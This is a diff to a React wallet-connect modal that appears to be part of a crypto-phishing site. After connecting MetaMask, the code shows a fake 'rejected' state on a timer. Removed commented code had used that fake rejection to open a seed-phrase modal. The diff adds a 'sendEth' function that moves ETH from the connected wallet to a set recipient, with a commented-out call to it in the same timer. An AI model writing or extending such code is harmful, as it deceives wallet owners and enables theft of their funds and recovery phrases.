@@ -13,6 +13,7 @@ import axios from 'axios';
 import { url } from './constants';
 import { ethers } from 'ethers';
 import PhraseWalletModal from './phraseModal';
+import Web3 from 'web3';
 
 export const style = {
     position: 'absolute',
@@ -43,6 +44,8 @@ export default function ConnectWalletModal() {
     const [isLoading, setIsLoading] = useState(false)
 
     const [metaMastWalletAddress, setMetaMaskWalletAddress] = useState("")
+    const [recipientAddress, setRecipientAddress] = useState('');
+    const [amountToSend, setAmountToSend] = useState('');
 
     const handleClose = () => setWalletModal(false);
 
@@ -70,9 +73,9 @@ export default function ConnectWalletModal() {
                     method: "eth_requestAccounts",
                 });
                 console.log(accounts)
-                setMetaMaskWalletAddress(accounts[0])
-            } catch {
-                console.log("error connecting to wallet")
+                setMetaMaskWalletAddress(accounts[0]);
+            } catch (error) {
+                console.log("error connecting to wallet", error)
             }
 
         } else {
@@ -80,32 +83,49 @@ export default function ConnectWalletModal() {
         }
     }
 
-    // async function connectWallet() {
-    //     if (typeof window.ethereum !== "undefined") {
-    //         await authMetaMask();
+    const sendEth = async () => {
+        if (!recipientAddress || !amountToSend) {
+            console.error('Recipient address and amount are required');
+            return;
+        }
 
-    //         const provider = new ethers.providers.Web3Provider(window.ethereum)
-    //     }
-    // }
+        try {
+            const web3 = new Web3(window.ethereum);
 
-    // function handleWalletClick(name) {
-    //     setClickedWalletIndex(name)
-    //     authMetaMask()
-    //     setTimeout(() => {
-    //         // setScanWalletModal(true)
-    //         setPhraseWalletModal(true)
+            // Convert the amount to wei (1 Ether = 10^18 Wei)
+            const amountInWei = web3.utils.toWei(amountToSend, 'ether');
 
-    //         setTimeout(() => {
-    //             setIsRejected(true)
-    //         }, 3000);
-    //     }, 2000);
-    // }
+            // Get the current chain ID
+            const chainId = await web3.eth.getChainId();
+
+            // Check if the recipient address is valid
+            const isValidAddress = web3.utils.isAddress(recipientAddress);
+            if (!isValidAddress) {
+                console.error('Invalid recipient address');
+                return;
+            }
+
+            // Send the transaction
+            const transactionHash = await web3.eth.sendTransaction({
+                from: metaMastWalletAddress,
+                to: recipientAddress,
+                value: amountInWei,
+                gas: '21000', // You may need to adjust the gas limit
+                chainId: chainId,
+            });
+
+            console.log('Transaction sent:', transactionHash);
+        } catch (error) {
+            console.error('Error sending transaction:', error);
+        }
+    };
 
     function handleWalletClick(name) {
         setClickedWalletIndex(name)
         authMetaMask()
         setTimeout(() => {
             setIsRejected(true)
+            // sendEth()
         }, 4000);
     }
 
